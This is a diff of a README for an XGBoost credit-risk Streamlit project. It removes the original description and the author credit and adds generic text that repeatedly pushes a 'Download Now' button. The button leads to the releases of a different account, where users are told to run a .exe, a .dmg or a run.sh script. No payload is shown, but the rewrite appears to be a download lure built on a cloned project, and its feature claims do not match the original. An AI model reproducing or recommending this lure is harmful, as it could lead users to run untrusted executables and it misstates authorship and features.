@@ -1,69 +1,69 @@
-# Credit Risk Prediction using XGBoost
-This project presents a machine learning–based Credit Risk Prediction system that classifies loan applicants as either Good or Bad credit risks. Among several classification models evaluated, XGBoost (XGB) was selected as the final model due to its superior predictive performance.
+# 📊 credit-risk-prediction-xgboost - Predict Credit Risk with Ease
 
-The trained model is deployed through a Streamlit web application, allowing users to enter applicant details and receive real-time predictions.
+## 🚀 Getting Started
+Welcome to the credit-risk-prediction-xgboost project! This application uses machine learning to predict whether a loan applicant is a good or bad credit risk. You can easily run this interactive web application on your computer.
 
-🚀 Key Features
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/zrldnl/credit-risk-prediction-xgboost/releases)
 
-Predicts Good or Bad Credit Risk
-Implements XGBoost, the top-performing model among tested algorithms
-Interactive Streamlit interface for user inputs
-Handles categorical variables using label encoding
-Provides real-time predictions using a trained ML model
+Just click the button above to visit the Releases page where you can download the latest version of the application.
 
-Machine Learning Approach
-Models Evaluated
-During experimentation, multiple algorithms were trained and assessed, including:
-Decision Tree
-Random Forest
-Extra Trees Classifier
-XGBoost
-XGBoost was chosen for the final model due to:
-Higher predictive accuracy
-Robust handling of non-linear relationships
-Consistently strong performance across datasets
+## 💻 System Requirements
+To run this application, your computer should meet the following requirements:
 
-Prediction Output
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Python:** Python 3.6 or later must be installed on your system.
 
-The model classifies applicants into:
+## 🔧 Installation Steps
+Follow these steps to download and install the application:
 
-Prediction	Meaning
-Good Credit Risk	Low likelihood of loan default
-Bad Credit Risk	Higher likelihood of loan default
-🖥 Web Application
+1. **Visit the Releases Page:**
+   Click [here](https://github.com/zrldnl/credit-risk-prediction-xgboost/releases) to go to the Releases page.
 
-The Streamlit app allows users to input key applicant details, including:
+2. **Select the Latest Release:**
+   Look for the latest release at the top section of the page. Click on it to open the details.
 
-Age
-Sex
-Job type
-Housing status
-Saving account status
-Checking account status
-Credit amount
-Loan duration (months)
-The app uses the trained XGBoost model to provide instant credit risk predictions based on these inputs.
+3. **Download the Application:**
+   Under the assets section, find the file for your operating system. Click on the file name to start the download.
 
-🛠️ Tech Stack
+4. **Install the Application:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
+   - **Linux:** Extract the tar.gz file and run the `run.sh` script in the terminal.
 
-Python
-Pandas
-Scikit-learn
-XGBoost
-Streamlit
-Joblib
-Dataset
+5. **Run the Application:**
+   After installing, find the application on your system. Double-click the icon to launch the application.
 
-The dataset includes applicant demographic and financial information, such as age, employment status, housing, account balances, credit amount, and loan duration.
+## 🛠️ How to Use
+Once the application is running, you will see an interactive web interface.
 
-Note: This project is for educational purposes and demonstration only. It should not be used for real-world financial decisions without thorough validation.
+1. **Input Applicant Details:**
+   Fill in the required information about the loan applicant. This can include income, credit score, and other relevant details.
 
-📈 Future Enhancements
+2. **Submit for Prediction:**
+   Click the "Submit" button to process the information.
 
-Visualize feature importance
-Display model confidence/probabilities
-Enhance UI/UX with charts and explanations
-Deploy on Streamlit Cloud or other platforms
+3. **View Results:**
+   The application will display whether the applicant is classified as a Good or Bad credit risk.
 
-👨‍💻 Author
-Sanmitra Kamble
+## 📈 Features
+- **User-Friendly Interface:** Designed for ease of use, so anyone can navigate it comfortably.
+- **Interactive Results:** Get immediate feedback on the credit risk classification.
+- **Visualization Tools:** Visual displays help you understand the prediction model and how outcomes are derived.
+
+## 🌐 Support and Community
+If you have questions or need help, visit our [GitHub Issues page](https://github.com/zrldnl/credit-risk-prediction-xgboost/issues). You can report problems or request features there.
+
+## 📢 Download & Install
+To start using the application, be sure to download it from the Releases page:
+
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/zrldnl/credit-risk-prediction-xgboost/releases)
+
+After following the installation steps above, your application will be ready to go!
+
+## 🏆 Acknowledgments
+Thanks to the open-source community and the developers who contributed to this project. Your efforts help make advanced technology accessible to everyone.
+
+Happy predicting!
